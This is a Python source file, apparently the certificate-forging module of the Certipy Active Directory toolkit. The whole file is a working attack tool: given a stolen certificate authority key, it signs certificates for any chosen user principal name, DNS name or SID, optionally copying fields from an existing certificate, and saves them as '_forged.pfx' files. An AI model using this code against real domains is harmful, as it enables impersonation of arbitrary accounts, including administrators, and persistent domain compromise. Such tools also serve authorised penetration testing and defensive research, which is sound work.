import argparse
import datetime
from typing import Callable, Tuple

from certipy.lib.certificate import (
    PRINCIPAL_NAME,
    UTF8String,
    cert_id_to_parts,
    create_pfx,
    encoder,
    generate_rsa_key,
    get_subject_from_str,
    load_pfx,
    x509,
    asn1x509,
    NTDS_CA_SECURITY_EXT,
    szOID_NTDS_OBJECTSID
)
from certipy.lib.logger import logging


class Forge:
    def __init__(
        self,
        ca_pfx: str = None,
        upn: str = None,
        dns: str = None,
        sid: str = None,
        template: str = None,
        subject: str = None,
        issuer: str = None,
        crl: str = None,
        serial: str = None,
        key_size: int = 2048,
        out: str = None,
        **kwargs
    ):
        self.ca_pfx = ca_pfx
        self.alt_upn = upn
        self.alt_dns = dns
        self.alt_sid = sid
        self.template = template
        self.subject = subject
        self.issuer = issuer
        self.crl = crl
        self.serial = serial
        self.key_size = key_size
        self.out = out
        self.kwargs = kwargs

    def get_serial_number(self) -> int:
        serial_number = self.serial
        if serial_number is None:
            serial_number = x509.random_serial_number()
        else:
            serial_number = int(serial_number.replace(":", ""), 16)
        return serial_number

    def get_crl(self, crl: str = None) -> x509.CRLDistributionPoints:
        if crl is None:
            crl = self.crl
        if crl:
            return x509.CRLDistributionPoints(
                [
                    x509.DistributionPoint(
                        full_name=[x509.UniformResourceIdentifier(crl)],
                        relative_name=None,
                        reasons=None,
                        crl_issuer=None,
                    )
                ]
            )
        return None

    def forge(self):
        with open(self.ca_pfx, "rb") as f:
            ca_pfx = f.read()
        ca_key, ca_cert = load_pfx(ca_pfx)

        if self.alt_upn:
            id_type, id_value = "UPN", self.alt_upn
        else:
            id_type, id_value = "DNS Host Name", self.alt_dns

        if self.template is not None:
            with open(self.template, "rb") as f:
                tmp_pfx = f.read()
            key, tmp_cert = load_pfx(tmp_pfx)

            subject = self.subject
            if subject is None:
                subject = tmp_cert.subject
            else:
                subject = get_subject_from_str(self.subject)

            serial_number = self.serial
            if serial_number is None:
                serial_number = tmp_cert.serial_number
            else:
                serial_number = int(serial_number.replace(":", ""), 16)

            cert = x509.CertificateBuilder()
            cert = cert.subject_name(subject)
            if self.issuer:
                cert = cert.issuer_name(get_subject_from_str(self.issuer))
            else:
                cert = cert.issuer_name(ca_cert.subject)
            cert = cert.public_key(tmp_cert.public_key())
            cert = cert.serial_number(serial_number)
            cert = cert.not_valid_before(tmp_cert.not_valid_before)
            cert = cert.not_valid_after(tmp_cert.not_valid_after)

            cert = cert.add_extension(
                x509.AuthorityKeyIdentifier.from_issuer_public_key(ca_key.public_key()),
                False,
            )

            skip_extensions = [
                x509.AuthorityKeyIdentifier.oid,
                x509.SubjectAlternativeName.oid,
                x509.ExtendedKeyUsage.oid,
            ]

            crl = self.get_crl()
            if crl is not None:
                skip_extensions.append(x509.CRLDistributionPoints.oid)
                cert = cert.add_extension(crl, False)

            extensions = tmp_cert.extensions
            for extension in extensions:
                if extension.oid in skip_extensions:
                    continue
                cert = cert.add_extension(extension.value, extension.critical)

            signature_hash_algorithm = tmp_cert.signature_hash_algorithm.__class__
        else:
            key = generate_rsa_key(self.key_size)

            subject = self.subject
            if subject is None:
                subject = get_subject_from_str(
                    "CN=%s" % cert_id_to_parts([(id_type, id_value)])[0]
                )
            else:
                subject = get_subject_from_str(self.subject)

            serial_number = self.serial
            if serial_number is None:
                serial_number = x509.random_serial_number()
            else:
                serial_number = int(serial_number.replace(":", ""), 16)

            cert = x509.CertificateBuilder()
            cert = cert.subject_name(subject)
            if self.issuer:
                cert = cert.issuer_name(get_subject_from_str(self.issuer))
            else:
                cert = cert.issuer_name(ca_cert.subject)
            cert = cert.public_key(key.public_key())
            cert = cert.serial_number(serial_number)
            cert = cert.not_valid_before(
                datetime.datetime.utcnow() - datetime.timedelta(days=1)
            )
            cert = cert.not_valid_after(
                datetime.datetime.utcnow() + datetime.timedelta(days=365)
            )

            cert = cert.add_extension(
                x509.AuthorityKeyIdentifier.from_issuer_public_key(ca_key.public_key()),
                False,
            )

            cert = cert.add_extension(
                x509.SubjectKeyIdentifier.from_public_key(key.public_key()),
                False,
            )

            crl = self.get_crl()
            if crl is not None:
                cert = cert.add_extension(crl, False)

            signature_hash_algorithm = ca_cert.signature_hash_algorithm.__class__

        sans = []
        sans = []

        alt_dns = self.alt_dns
        if alt_dns:
            if type(alt_dns) == bytes:
                alt_dns = alt_dns.decode()

            sans.append(x509.DNSName(alt_dns))

        alt_upn = self.alt_upn
        if alt_upn:
            if type(alt_upn) == str:
                alt_upn = alt_upn.encode()
            alt_upn = encoder.encode(UTF8String(alt_upn))

            sans.append(x509.OtherName(PRINCIPAL_NAME, alt_upn))

        cert = cert.add_extension(
            x509.SubjectAlternativeName(sans),
            False,
        )

        alt_sid = self.alt_sid
        if alt_sid:
            if type(alt_sid) == str:
                alt_sid = alt_sid.encode()

            sid_extension = asn1x509.GeneralNames([asn1x509.GeneralName(
                    {
                        "other_name": asn1x509.AnotherName(
                            {
                                "type_id": szOID_NTDS_OBJECTSID,
                                "value": asn1x509.OctetString(alt_sid).retag(
                                    {"explicit": 0}
                                ),
                            }
                        )
                    }
                )]
            )

            cert = cert.add_extension(
                x509.UnrecognizedExtension(NTDS_CA_SECURITY_EXT, sid_extension.dump()),
                False,
            )

        cert = cert.sign(ca_key, signature_hash_algorithm())

        pfx = create_pfx(key, cert)

        out = self.out
        if not out:
            out, _ = cert_id_to_parts([(id_type, id_value)])
            out = "%s_forged.pfx" % out.rstrip("$").lower()

        with open(out, "wb") as f:
            f.write(pfx)

        logging.info("Saved forged certificate and private key to %s" % repr(out))


def entry(options: argparse.Namespace) -> None:
    if not options.upn and not options.dns:
        logging.error("Either -upn or -dns must be specified (or both)")
        return

    forge = Forge(
        **vars(options),
    )

    forge.forge()
